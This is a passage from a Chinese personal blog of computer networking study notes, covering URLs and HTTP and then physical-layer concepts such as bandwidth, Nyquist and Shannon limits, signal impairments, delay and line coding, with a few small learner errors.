<p>1.万维网用户希望使用浏览器访问某个URL,与该URL所在的服务器建立连接,发送浏览请求</p>
<p>2.服务器把URL转换为文件路径,返回信息给客户端</p>
<p>3.通信完毕,关闭连接</p>
<h3 id="统一资源定位符-URL"><a href="#统一资源定位符-URL" class="headerlink" title="统一资源定位符(URL)"></a>统一资源定位符(URL)</h3><p>负责标识万维网上的各种文档,使每个文档有唯一的标识符(链接地址)</p>
<p>一般形式:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</span><br></pre></td></tr></table></figure>

<p>其中端口和路径可以略去不写,整个URL不区分大小写</p>
<blockquote>
<p>比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.baidu.com/</span><br></pre></td></tr></table></figure>

<p>https是协议</p>
<p><a target="_blank" rel="noopener" href="http://www.baidu.com是主机的dns地址,实际上映射到220.181.38.251/">www.baidu.com是主机的DNS地址,实际上映射到220.181.38.251</a></p>
</blockquote>
<p>常见的协议有http,ftp,https等</p>
<h3 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a>超文本传输协议HTTP</h3><p>协议规定了</p>
<p>1.浏览器怎样想万维网服务器请求资源</p>
<p>2.服务器怎样把文档传给浏览器</p>
<p>即规定了怎么去和怎么回来</p>
<h4 id="HTTP操作过程"><a href="#HTTP操作过程" class="headerlink" title="HTTP操作过程"></a>HTTP操作过程</h4><p>1.客户端(浏览器)对要访问的www服务器请求DNS域名解析,获得该服务器IP地址</p>
<p>2.客户端通过TCP向服务器发起建立连接的请求,这是第一次握手</p>
<p>3.服务器在TCP的80端口监听到客户端发出的请求,与客户端建立连接,这是第二次握手</p>
<p>4.在客户端与服务器的第三次握手时客户端发送获取&#x3D;&#x3D;服务器拥有的某个文件&#x3D;&#x3D;的请求报文</p>
<p>5.服务器返回&#x3D;&#x3D;该文件web页面的必须信息&#x3D;&#x3D;(注意此时还没有完全返回该页面,只是返回了基本的框架,很多元素比如jpeg图片等需要后续继续请求才能发送)</p>
<p>6.客户端浏览器收到资源并解释,及时显示给用户</p>
<p>7.客户端一直发送请求直到页面加载完成,此时TCP连接断开</p>
<p>客户端向服务端发出的是请求,服务端向客户端发出的是响应</p>
<p>没有请求就没有响应,请求时客户端主动发出的,服务端不会多管闲事</p>
<p>请求和响应必须遵循规定的规则和格式,即HTTP</p>
<h4 id="HTTP特点"><a href="#HTTP特点" class="headerlink" title="HTTP特点"></a>HTTP特点</h4><p>1.本身无状态</p>
<p>服务器不会记录客户信息,任何客户不管第几次访问同一个页面时显示的内容都是相同的.这样设计的目的是减轻服务器的压力,使其支持大量并发的HTTP请求</p>
<blockquote>
<p>Cookie+数据库获取用户历史浏览信息</p>
<p>后来引入Cookie技术之后,服务器只需要记录客户端的身份信息,客户自己的喜好,密码等等信息都存储在客户机器上,当客户端第一次访问某个服务器时,服务器在数据库中记录该客户端的身份信息.客户端自己记录自己的个人喜好和隐私信息.</p>
<p>当客户端下一次访问这个服务器时,服务器就能从数据库记录中知道这个客户曾经来过,然后可以根据客户cookie获得客户喜好了</p>
<p>这时状态是来自cookie的辅助,与http本身无状态不矛盾</p>
</blockquote>
<p>2.传输层协议使用TCP</p>
<p><strong>3.既可以使用非持久连接,也可以使用持久连接</strong></p>
<p>非持久连接:对于客户端的每一个请求,服务器返回响应后立刻断开TCP连接</p>
<p>持久连接:服务器对于客户端的请求返回响应之后并不立刻断开TCP连接,而是等待下一次请求,直到客户端发出停止连接的要求或者连接失败</p>
<blockquote>
<p>持久连接的两种方式:</p>
<p>流水线方式:请求是串行的,客户端发出A请求,必须收到服务端的响应之后才可以发出下一个B请求</p>
<p>非流水线方式:请求是并行的,客户端一股脑发出多个请求,剩下的任务就是接收服务端的多个响应</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d6672322cb5522779a9cadb20b0b726e.png"></p>
</blockquote>
<h4 id="HTTP报文结构"><a href="#HTTP报文结构" class="headerlink" title="HTTP报文结构"></a>HTTP报文结构</h4><p>HTTP面向文本,报文由ASCII码字符串组成</p>
<p>报文由两类:请求报文和响应报文</p>
<p>两种报文都是由三部分组成:</p>
<p>开始行,首部行,实体主题</p>
<p>区别在于开始行不同</p>
<p>请求报文的开始行是请求行</p>
<p>响应报文的开始行是状态行</p>
<h5 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h5><p><img src="https://img-blog.csdnimg.cn/img_convert/9402acb15d554bc0a90012bffb10fa56.png"></p>
<p>请求行&#x3D;请求用到的方法+space+请求资源的URL+space+HTTP版本号+回车换行</p>
<blockquote>
<p>请求方法作用于请求对象</p>
<p>请求常用方法:</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/85915b69c67049cf59593f06dc430591.png"></p>
</blockquote>
<h5 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h5><p><img src="https://img-blog.csdnimg.cn/img_convert/72e019bbb1ce7edd8c5f7bc9d0eaf6c7.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/02/12/%E7%89%A9%E7%90%86%E5%B1%82/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/12/%E7%89%A9%E7%90%86%E5%B1%82/" class="post-title-link" itemprop="url">计算机网络-物理层</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-12 15:23:00 / Modified: 17:17:15" itemprop="dateCreated datePublished" datetime="2023-02-12T15:23:00+08:00">2023-02-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="计算机网络-物理层"><a href="#计算机网络-物理层" class="headerlink" title="计算机网络-物理层"></a>计算机网络-物理层</h1><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>比特率:一秒内发送的位数,bps,b&#x2F;s</p>
<p>比特长度&#x3D;传播速度*传播时间,即一个比特在传输介质上的距离</p>
<p>复合信号:简单正弦信号的叠加信号</p>
<p>带宽:符合信号的组成成分中,最高频率与最低频率的差</p>
<p>模拟信号:用连续变化的物理量表示信息</p>
<p>数字信号:用离散的物理量表示信息</p>
<blockquote>
<p>模拟信号和数字信号的关系</p>
<p>实际上数字信号是带宽无穷大的复合的模拟信号</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205092343687.png" alt="image-20230205092343687"></p>
<p><img src="https://picx.zhimg.com/50/v2-71d923f79ccd06cbec2be71698bf9923_720w.webp?source=1940ef5c" alt="拟合方波的过程"></p>
<p>至于为啥非周期性的数字信号,其频率是连续的,而周期性的数字信号,其频率是离散的呢?</p>
<p>也就是说,为什么周期性的数字信号做傅里叶变换之后,在频域得到的是频率离散的正弦波呢?</p>
<p><strong>首先证明,离散的正弦波叠加一定能够得到周期性复合波形</strong></p>
<p>直接取这些正弦波周期的最小公倍数,一定是该复合波形的周期</p>
<p>对于$f(x)&#x3D;Asin(\omega x+\phi)$设T为其周期,则有$f(x+T)&#x3D;f(x)$</p>
<p>不妨设这些正弦波的最小公倍数为nT</p>
<p>那么<br>$$<br>f(x+nT)&#x3D;f((x+(n-1)T)+T)&#x3D;f(x+(n-1)T)&#x3D;…&#x3D;f(x)<br>$$<br>对于$F(x)&#x3D;\sum_{i&#x3D;0}^n A_isin(\omega_ix+\phi_i)&#x3D;\sum_{i&#x3D;0}^n f(x)$</p>
<p>自然有$F(x+nT)&#x3D;F(x)$</p>
<p><strong>然后证明,连续频率的正弦波叠加,无法形成周期性信号</strong></p>
<p>假设$f(x)&#x3D;Asin(\omega x+\phi)$,其中$\omega$在$[a,b]$上连续</p>
<p>则<br>$$<br>F(x)&#x3D;\int_{a}^bA(\omega) sin(\omega x+\phi(\omega)) d\omega<br>$$<br>即证明$F(x)$不是周期函数</p>
<p>假设$F(x)$是周期函数,设T为其一个周期,则有F(0)&#x3D;F(T),那么就得有<br>$$<br>\int_{a}^bA(\omega) sin(\phi(\omega)) d\omega&#x3D;\int_{a}^bA(\omega) sin(\omega T+\phi(\omega)) d\omega<br>$$</p>
<p>即<br>$$<br>\int_{a}^b A(\omega)[sin(\phi(\omega)) - sin(\omega T+\phi(\omega))] d\omega&#x3D;0<br>$$<br>其中<br>$$<br>sin(\phi(\omega)) - sin(\omega T+\phi(\omega))&#x3D;2cos\frac{2\phi(\omega)+wT}{2}sin\frac{-\omega T}{2}<br>$$<br>然而这个式子无法证明成立,倒是可以举反例证明不成立,比如令A&#x3D;1,$\phi&#x3D;0$</p>
<p>则$-\int_{a}^b sin\omega \ d\omega&#x3D;0$显然不正确,因为a,b可能不够一个周期</p>
<p><strong>为什么说数字信号是带宽无穷大的复合模拟信号?</strong></p>
<p>先说为啥数字信号是一个模拟信号</p>
<p>根据傅里叶变换,非周期数字信号是连续频率的正弦波的叠加</p>
<p>周期数字信号是离散频率的正弦波的叠加</p>
<p>这个频率的上下界是多少?下界是0,上界是无穷大,为啥是无穷大?</p>
<p><img src="https://picx.zhimg.com/50/v2-71d923f79ccd06cbec2be71698bf9923_720w.webp?source=1940ef5c" alt="拟合方波的过程"></p>
<p>N越大,也就是谐波越多,波形越接近方波,拐弯的时候越接近直角</p>
<p>当N趋向无穷大时,才可以认为波形是方波</p>
<p><strong>振幅体现成什么?</strong></p>
<p>在频域图上观察更加明显</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/v2-99884a566f11393b11c1a597a0fabe09_r.jpg" alt="6. 傅里叶变换与图像的频域处理 - 知乎"></p>
<p>振幅越大的分量,代表这个分量信号在复合信号中的影响更大.</p>
<p>可以这样理解:</p>
<p>三个人一起说话,我们从远处只能听见说话声音大的那个一,几乎听不到其他人说话,但是实际上我们听到的是三人声音的复合信号,只不过另外两个人的劲太小,发出的信号振幅小,能量小,我们听不清</p>
</blockquote>
<h3 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h3><h4 id="基带传输"><a href="#基带传输" class="headerlink" title="基带传输"></a>基带传输</h4><p>直接传输数字信号,要求该信号的最低频率成分,其频率是0.</p>
<p>理想情况下,传递1101110这么一串信息,可能就是高高低高高高低电平的变换.</p>
<p>但是实际上由于基带传输需要无穷大的带宽,而实际的信道带宽有限</p>
<p>这就意味着,要噶掉一些频率过高或者过低的谐波.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205101233925.png" alt="image-20230205101233925"></p>
<p>这就会造成波形失真</p>
<blockquote>
<p>为什么噶掉一些谐波就会造成波形失真?</p>
<p><img src="https://picx.zhimg.com/50/v2-71d923f79ccd06cbec2be71698bf9923_720w.webp?source=1940ef5c" alt="拟合方波的过程"></p>
<p>还是这个图,如果只保留N&#x3D;1,也就是噶掉了其他所有频率的分量,那么图像就是只一个正弦波,根本看不出方波了</p>
</blockquote>
<p>如果被噶掉的部分,有些频率的分量,其振幅很大,也就是在符合信号中的话语权比较重,那么被噶掉之后,波形失真就会很厉害</p>
<blockquote>
<p>这就好比一场音乐会,去掉一些和声,普通人可能也察觉不出来</p>
<p>但是去掉劲最大的主唱,傻子也能听出来,怎么开始放伴奏了?</p>
</blockquote>
<p>但是只要能够保持波形的大概就可以了,接收方会复原信号</p>
<p>因此使用有限频率的分量就可以了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205101834194.png" alt="image-20230205101834194"></p>
<p>一个例题说明这个事情</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205102120566.png" alt="image-20230205102120566"></p>
<p>也就是说,更高的带宽是为了容纳更多谐波,使得波形更接近方波,使得分辨更清晰</p>
<p><strong>比特率和带宽的关系:正比</strong></p>
<p>比特率是单位时间内发送的位数</p>
<p>为啥说单位时间内发送的位越多,要求的带宽就越大呢?</p>
<p>下图可以从直观上说明这个事情</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205102250459.png" alt="image-20230205102250459"></p>
<p>相同时间(1s)内,有四种电平的方波,可以发送16个比特位,比特率就是16bps</p>
<p>而只有两种电平的方波,只能发送8位,比特率就是8bps</p>
<p>也就是,要证明电平种类数越多,需要的带宽就越大</p>
<p><strong>直观上</strong>,要拟合一个只有两种电平的数字信号,需要的谐波要少点.</p>
<p>也就是说这个方波越复杂,拟合时需要的谐波就要更多</p>
<p>但是怎么证明我不会</p>
<h4 id="宽带传输"><a href="#宽带传输" class="headerlink" title="宽带传输"></a>宽带传输</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205102704785.png" alt="image-20230205102704785"></p>
<p>宽带传输允许的频率不是从0开始的,是从某一个正数f1开始的</p>
<p>“这就导致不能直接发送数字信号”为啥呢?</p>
<p>推测其原因是</p>
<p>1,是数字信号的主要分量(主要也就是振幅比较大,权重比较大的那些分量),其频率较低,在f1之下,会被噶掉,造成严重的失真</p>
<p>2,就算被噶掉的无关紧要,但是考虑衰减问题</p>
<p>可能发出时的信号很强,01分明,但是百前公里之后信号就会衰减,届时可能辱下图所示</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205104236117.png" alt="image-20230205104236117"></p>
<p>原来的高电位也变得低趴,被接收方识别为0</p>
<p>但是可以采取中继措施啊(<del>比如红石中继器</del>),上述推测2也不是问题啊</p>
<p>然而实际上也没有对数字信号采取中继,数字信号被应用于芯片比如CPU,计算机主板这种东西上,或者以太网这种局域网(曼切斯特编码等等)</p>
<p>那么为啥远距离传输一定要模拟信号呢</p>
<p>知乎的解答:</p>
<p>“以电话线为例子,电话线主要用来传语音（300到3400赫兹），不适合直接传输频带很宽<strong>能量比较集中在低频段</strong>的数字基带信号，所以这里需要一个modem做频带调制解调.”</p>
<p><strong>也就是推测1</strong></p>
<p>那么为啥不能让电话线的最低频率再低一点,低到0?或者说,一根电线,其允许传播的电信号频率范围是多少?这个可以人为改变吗?</p>
<p>也就是说,计算机只会收发数字信号,两个modem之间才会使用模拟信号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">C1((C1))</span><br><span class="line">C2((C2))</span><br><span class="line">subgraph 远距离通信</span><br><span class="line">	Modem1(Modem1)</span><br><span class="line">	Modem2(Modem2)</span><br><span class="line">end</span><br><span class="line">C1--&quot;数字信号&quot;---Modem1</span><br><span class="line">Modem1--&quot;模拟信号&quot;---Modem2</span><br><span class="line">Modem2--&quot;数字信号&quot;---C2</span><br></pre></td></tr></table></figure>

<p>在两个计算机看来,他俩是直接数字信号通信的,他俩不知道中间有个猫干了啥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">C1((C1))</span><br><span class="line">C2((C2))</span><br><span class="line">C1--数字信号----C2</span><br></pre></td></tr></table></figure>

<h5 id="传输减损"><a href="#传输减损" class="headerlink" title="传输减损"></a>传输减损</h5><p>三种类型的减损:衰减,失真,噪声</p>
<h5 id="衰减"><a href="#衰减" class="headerlink" title="衰减"></a>衰减</h5><p>衰减:远距离传输信息肯定有衰减,就比如在泰安说句话在西安听不见,可能十步之外就听不见了,这就是衰减</p>
<p>衰减的原因是介质震动将能量传递给其他物质了,比如空气</p>
<p>衰减只会让能量减弱,不会改变信号的频率相位,而能量直接提现到振幅上,因此画在图上,衰减就是信号变得低趴</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205214605628.png" alt="image-20230205214605628"></p>
<p>使用分贝作为单位衡量衰减程度<br>$$<br>dB&#x3D;10\lg{\frac{P_2}{P_1}}<br>$$<br>其中P1是衰减前的功率,P2是衰减之后的功率</p>
<p>假设功率衰减为之前的一半,$10\lg\frac{1}{2}\approx-3dB$</p>
<h5 id="失真"><a href="#失真" class="headerlink" title="失真"></a>失真</h5><p>失真就是信号波形发生了变化,相位,频率都可能变化</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205215029546.png" alt="image-20230205215029546"></p>
<p>发生失真可能是电子元件本身导致,比如三极管就有失真区</p>
<h5 id="噪声"><a href="#噪声" class="headerlink" title="噪声"></a>噪声</h5><p>噪声就是杂音,就比如上课时老师讲话是有效信息,学生嘀咕就是噪音</p>
<p>噪音能量大了,就会淹没有效信息,如下图所示</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205215750791.png" alt="image-20230205215750791"></p>
<blockquote>
<p>信号中的噪音可能来自</p>
<p>热噪音:导体中电子热震动造成</p>
<p>串扰:两条信号线之间的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%80%A6%E5%90%88/2821124?fromModule=lemma_inlink">耦合</a>、信号线之间的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BA%92%E6%84%9F/1016820?fromModule=lemma_inlink">互感</a>和互容引起线上的噪声。</p>
<p>脉冲噪声:磁暴就可以导致</p>
</blockquote>
<p>噪声程度用信噪比衡量<br>$$<br>信噪比SNR&#x3D;\frac{平均信号功率P_{信号}}{平均噪声功率P_{噪声}}<br>$$<br>单位是分贝</p>
<h3 id="无噪声信道数据速率"><a href="#无噪声信道数据速率" class="headerlink" title="无噪声信道数据速率"></a>无噪声信道数据速率</h3><p>数据速率(比特率):一秒内传送的比特数</p>
<p>三个影响因素:有效带宽,使用的信号电平数,通道质量</p>
<p>理论最大比特率(无噪声信道):<br>$$<br>理论上的最大比特率 &#x3D; 2 × 带宽 ×  log_2 L，  L是电平数<br>$$<br>如果只有两个电平,只能一个电平表示一位,</p>
<p>有四个电平,则每个电平可以编码两位</p>
<p>依此类推</p>
<p>但是,为啥带宽和比特率会发生关系呢?</p>
<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44586473/article/details/104372110">深入理解奈奎斯特第一准则与码间串扰</a></p>
<h4 id="奈奎斯特第一准则直观理解"><a href="#奈奎斯特第一准则直观理解" class="headerlink" title="奈奎斯特第一准则直观理解"></a>奈奎斯特第一准则直观理解</h4><p>考虑这么一个问题</p>
<p>同样一秒时间内,我让电平变化越快,岂不是传递的信息越多吗?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205220410948.png" alt="image-20230205220410948"></p>
<p>那么我让一个bit位持续时间只有1皮秒,那么1秒内直接传输1e9 个bit,岂不美哉?</p>
<p>这就是带宽的限制的作用了</p>
<p>单位时间内电位变化越快,说明信号的频率越大,显然信号的最大频率不能超过信道的频率上限.比这个上限再高的分量会被直接噶掉</p>
<p>最大比特率也就是说,在一秒内能够传递$ 2 × 带宽 ×  log_2 L$这么多bit,为啥不能比这再高了呢?为啥会和带宽挂钩,而不是和最高频率挂钩?</p>
<p>因为当比特率大于这个值时,会发生<strong>码间串扰</strong></p>
<p>啥是码间串扰呢?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230205222514271.png" alt="image-20230205222514271"></p>
<p>怎么发生的码间串扰?我有一个直观的理解了</p>
<p>发生器在产生一个码元之后,应立刻变换模式生成下一个模式,这里不应该存在码间串扰</p>
<p>**为什么说前一个码元在后续时刻有残留呢?**这个残留是怎么来的呢?</p>
<p>百度百科是这样解答的:</p>
<blockquote>
<p>直方脉冲的波形在时域内比较尖锐，因而在频域内占用的带宽是无限的。</p>
<blockquote>
<p>直观上,拟合一个尖锐变化的信号,需要无限多高频的分量</p>
</blockquote>
<p>如果让这个脉冲经过一个低通滤波器，即让它的频率变窄，那么它在时域内就一定会变宽。</p>
<blockquote>
<p><strong>这是关键</strong></p>
<p>首先,为啥信号频率变窄,时域就得展宽?</p>
<p>这是傅里叶变换的展缩特性<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44252933/article/details/123654783">展缩特性的推导</a></p>
<p>我没学过傅里叶变换的细节,找到一个直观的理解</p>
<blockquote>
<p>因为脉冲信号是由不同频率的正弦波组合而成，通过低通滤波器，只剩下些低频正弦波，所以波形看起来更接近正弦波，像被展宽了一样。</p>
</blockquote>
<p>也就是说,频率上噶掉高频和低频之后,再进行傅里叶逆变换,时域图像会变,变宽</p>
<p>此前是一个码元完毕立刻跟着下一个码元,现在每个码元都宽了,把脚伸到下一个码元怀里了,也就是”拖尾”</p>
</blockquote>
<p>因为脉冲是一个序列，这样相邻的脉冲间就会相互干扰。这种现象被称为码间串扰（InterSymbol Interference，ISI）。</p>
</blockquote>
<p>最后一个问题,为啥比特率超过这个最大值$ 2 × 带宽 ×  log_2 L$就会造成码间串扰?</p>
<p>实际上这个$log_2L$就是波特率,也就是码元率,也就是单位时间内传送的码元个数</p>
<p>这实际上是奈奎斯特第一准则</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44586473/article/details/104372110">深入理解奈奎斯特第一准则与码间串扰</a></p>
<p>这篇博客完美解答了</p>
<p>写太好了写太好了写太好了</p>
<p>博主用一个实验证明了不遵守奈一准则的后果,实验是这样设计的:</p>
<p>首先,要发射方波,但是理想的方波的频率无限大,显然真实的信道做不到</p>
<p>于是用sinc脉冲函数作为近似拟合,该函数的带宽是2B,也就是说,该信号包括了2B带宽范围内的各种强度的连续频率的简谐信号分量,也就模拟了无噪声信道</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20200218130601438.png" alt="img"></p>
<p>用这个最高的尖作为方波</p>
<p>要发送比特序列00010110,用正高电位表示0,负高电位表示0</p>
<p>对应电位处放上函数的尖儿</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20200218132828290.png" alt="img"></p>
<p>实际上发出的信号是这几个sinc函数的叠加</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20200218133151349.png" alt="img"></p>
<p>接收方收到后进行采样,决定某个时刻是哪一个码元</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20200218133727575.png" alt="img"></p>
<p>采样结果</p>
<p><img src="https://img-blog.csdnimg.cn/20200218140840404.png" alt="img"></p>
<p>和发送时一模一样</p>
<p>好,下面要缩短码元的时间,也就是相同时间内企图发送更多的码元</p>
<p>之前是1秒内两个bit,现在是1秒内4个比特</p>
<p><img src="https://img-blog.csdnimg.cn/20200218141233915.png" alt="img"></p>
<p>叠加之后</p>
<p><img src="https://img-blog.csdnimg.cn/20200218141556530.png" alt="img"></p>
<p>接收方采样</p>
<p><img src="https://img-blog.csdnimg.cn/20200218142043666.png" alt="img"></p>
<p>已经无法在整1和-1处采到信息了</p>
<p>如果以大于0的作为1,小于0的作为0</p>
<p>接收方得到的序列就是111101001,失真了</p>
<h3 id="有噪声信道数据速率"><a href="#有噪声信道数据速率" class="headerlink" title="有噪声信道数据速率"></a>有噪声信道数据速率</h3><p>定义通道容量:单位时间内通道传输的比特数</p>
<h4 id="香农定理"><a href="#香农定理" class="headerlink" title="香农定理"></a>香农定理</h4><p>$$<br>通道容量C&#x3D;带宽B\times \log_2(1+SNR)\<br>$$</p>
<p>其中$SNR&#x3D;\frac{P_{信号}}{P_{噪声}}$</p>
<p>如果SNR很大,可以认为$SNR\sim SNR+1$,则有<br>$$<br>C&#x3D;B\times \log_2 SNR&#x3D;B\times \frac{SNR_{dB}}{3}<br>$$<br>香农定理规定了真实信道的最大传输速率</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shulianghan/article/details/108002782">物理层 : 香农定理</a></p>
<p>然而香农定律中没有涉及电平数量,实际中也正好利用这一点,结合奈奎斯特准则计算信号电平数</p>
<blockquote>
<p><strong>有一个 1MHz带宽的通道。通道的信噪比是 63，合适的比特率以及信号电平是多少？</strong></p>
<p>根据香农定律,理论上最高的通道容量为<br>$$<br>C&#x3D;B\times \log_2(1+SNR)&#x3D;1M\times \log_2(64)&#x3D;6Mbits&#x2F;s<br>$$<br>实际上的比特速率肯定比这要小,为了获取更好的<strong>性能</strong>,可以使用$N&#x3D;4Mbits&#x2F;s$为合适的比特率</p>
<p>根据奈奎斯特第一准则<br>$$<br>N&#x3D;2B\log_2L<br>$$<br>得到$L&#x3D;2$</p>
<p>这里的”性能”指什么呢?</p>
</blockquote>
<h3 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h3><h4 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h4><p>单位时间内成功传送的数据量.</p>
<p>单位:bit&#x2F;s,bps,同带宽相同</p>
<p>吞吐量和带宽的区别:</p>
<p>带宽只需要考虑信道的速率,不管两头的计算机,发射装置</p>
<p>而吞吐量需要考虑所有因素,包括计算机的速度,调制速度,带宽等</p>
<p>可以理解为,带宽用来衡量一段高速公路满载时的流量</p>
<p>但是吞吐量需要考虑高速公路两头的收费站减速</p>
<p>因此吞吐量一定是小于等于带宽的</p>
<h4 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h4><p>延迟 &#x3D; 传播延迟 + 传输时间 + 排队时间 + 处理延迟</p>
<p>传输时间就是发送方计算机将信息从本机发到信道上的时间</p>
<blockquote>
<p>取决于发送方CPU速度,总线,网络适配器等硬件的速度<br>$$<br>传输时间&#x3D;\frac{报文长度}{传输速度}<br>$$</p>
</blockquote>
<p><strong>传播延迟就是信号从信道中传递的时间</strong></p>
<blockquote>
<p>传播延迟取决于信号在信道中的传播速度,比如电信号在导线中的速度就是光速$3\times 10^8$<br>$$<br>传播延迟&#x3D;\frac{距离}{传播速度}<br>$$</p>
</blockquote>
<p>排队时间就是该信号在接收方消息队列中等待被处理的时间</p>
<blockquote>
<p>该时间取决于前面有多少个排队等待处理的消息以及这些消息的处理时间</p>
</blockquote>
<p>处理延迟就是接收方执行本信号处理程序花费的时间</p>
<blockquote>
<p>取决于接收方硬件速度,以及处理算法复杂度</p>
</blockquote>
<h5 id="带宽延迟积"><a href="#带宽延迟积" class="headerlink" title="带宽延迟积"></a>带宽延迟积</h5><p>定义了能够充满链路的位数</p>
<p>啥意思呢?</p>
<p>假如接收方在大洋彼岸,发送方传输一个bit,需要50ms才能抵达</p>
<p>而这50ms之内,发送方已经传输了成千上万个bit.</p>
<p>发送方一直传输,直到第一个bit到达接收方时,此时整个信道排满了bit</p>
<p>此时信道中的bit数量就是带宽延迟积</p>
<p>这一路上有多少辆车呢?<br>$$<br>带宽延迟积&#x3D;延迟\times 比特率<br>$$</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206153701581.png" alt="image-20230206153701581"></p>
<p>图中的带宽实际上描述的是数据速率,单位是bit&#x2F;s</p>
<h3 id="数字传输"><a href="#数字传输" class="headerlink" title="数字传输"></a>数字传输</h3><h4 id="线路编码"><a href="#线路编码" class="headerlink" title="线路编码"></a>线路编码</h4><h5 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h5><p>将数字数据转换为数字信号的过程</p>
<p>数据元素:信息的最小单元,一个位bit</p>
<p>信号元素(码元):数字信号的最小单元,是数据元素的载体</p>
<p>比率r:每个信号元素承载的bit数量</p>
<blockquote>
<p>把人比作数据元素,一个人相当于1bit</p>
<p>把车比作信号元素,一辆车是一个数据元素</p>
<p>比率为2,意思是一个信号元素承载两个bit,也就是一辆车可以坐俩人</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206163519913.png" alt="image-20230206163519913"></p>
<p>波形的每一个方格是一个信号元素,这个元素能够承载啥数据元素,承载几个,这是人为规定的</p>
<p>数据速率(比特率):一秒内发送的bit数</p>
<p>信号速率(波特率):一秒内发送的码元个数</p>
<p>两者关系:<br>$$<br>S&#x3D;c\times N\times \frac{1}{r},\<br>$$</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">S,信号速率</span><br><span class="line">N,数据速率</span><br><span class="line">c,情形因子,通常取值<span class="number">1</span>/<span class="number">2</span></span><br><span class="line">r,比率</span><br></pre></td></tr></table></figure>

<p>理想的数字信号,其带宽应该是无限大的,但是实际上信道的带宽有限,于是就有了奈奎斯特第一准则,对带宽的限制<br>$$<br>理论上的最比特率 &#x3D; 2 × 带宽×  log_2 L，  L是电平数<br>$$<br>也就是<br>$$<br>B_{min}&#x3D;\frac{N_{max}}{2\times \log_2L}&#x3D;\frac{cN}{r}&#x3D;S<br>$$</p>
<blockquote>
<p>这里数据元素和信号元素的关系体现在电平数量上$r&#x3D;\log_2 L$</p>
</blockquote>
